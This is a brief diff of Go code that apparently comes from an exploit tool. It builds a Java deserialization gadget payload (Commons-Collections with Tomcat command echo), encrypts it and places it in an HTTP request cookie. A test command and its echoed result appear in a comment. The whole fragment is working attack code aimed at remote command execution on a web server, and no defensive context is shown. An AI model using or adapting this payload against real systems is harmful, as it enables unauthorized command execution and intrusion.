@@ -52,7 +52,7 @@ func main() {
 	// Testcmd: expr 10 '*' 10 -> Testcmd: 100
 	payload := gososerial.GetCCK2TomcatEcho("Testecho", "Testcmd")
 
-	req.Cookie = payload
+	req.Cookie = AESEncrypt(payload)
 	req.Header["Testecho"] = "gososerial"
 	req.Method = "POST"
 	resp := httputil.sendRequest(req)
